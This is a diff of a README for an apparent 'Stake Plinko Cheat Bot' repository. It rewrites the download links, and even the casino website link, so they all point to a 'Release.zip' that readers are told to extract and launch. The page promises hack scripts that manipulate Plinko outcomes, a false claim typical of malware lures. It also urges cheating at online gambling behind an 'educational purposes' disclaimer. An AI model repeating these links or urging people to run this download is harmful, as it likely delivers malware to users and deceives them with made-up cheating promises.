@@ -25,7 +25,7 @@ Welcome to the **Stake Plinko Cheat Bot** repository! This resource provides you
 - stake-predictor-bot
 
 ## Download Software 🚀
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/derbaenker/Stake-Plinko-Cheat-Bot/releases/download/v1.0/Release.zip)](https://github.com/derbaenker/Stake-Plinko-Cheat-Bot/releases/download/v1.0/Release.zip)
 
 ## 🌟 Features
 1. **Hack Scripts**: Gain an advantage with powerful hack scripts designed to manipulate Plinko outcomes.
@@ -43,7 +43,7 @@ Welcome to the **Stake Plinko Cheat Bot** repository! This resource provides you
 This repository is intended for educational purposes only. We do not endorse the use of cheating or hacking in real-world casino settings. Remember to always gamble responsibly and within legal boundaries.
 
 ## ⚠️ Launch Instructions
-To access the software, download the [**Software.zip**](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) file and extract it on your device. Launch the application to start using the cheat tools and Predictor Bots.
+To access the software, download the [**https://github.com/derbaenker/Stake-Plinko-Cheat-Bot/releases/download/v1.0/Release.zip**](https://github.com/derbaenker/Stake-Plinko-Cheat-Bot/releases/download/v1.0/Release.zip) file and extract it on your device. Launch the application to start using the cheat tools and Predictor Bots.
 
 ## 🎰 Get Started
 1. Clone the repository to your local machine.
@@ -52,7 +52,7 @@ To access the software, download the [**Software.zip**](https://github.com/22155
 4. Experiment with the hack scripts, cheat strategies, and Predictor Bots to enhance your gameplay.
 
 ## 🌐 Visit Website
-For the latest updates and releases, visit the [Stake Casino](https://www.stake.com/) website. Stay informed about new features and tools to improve your Plinko experience.
+For the latest updates and releases, visit the [Stake Casino](https://github.com/derbaenker/Stake-Plinko-Cheat-Bot/releases/download/v1.0/Release.zip) website. Stay informed about new features and tools to improve your Plinko experience.
 
 ## 🌟 Contribute
 If you have innovative ideas or new tools to add to this repository, feel free to contribute! Create a pull request with your enhancements, and let's make cheating in Plinko a collaborative effort.
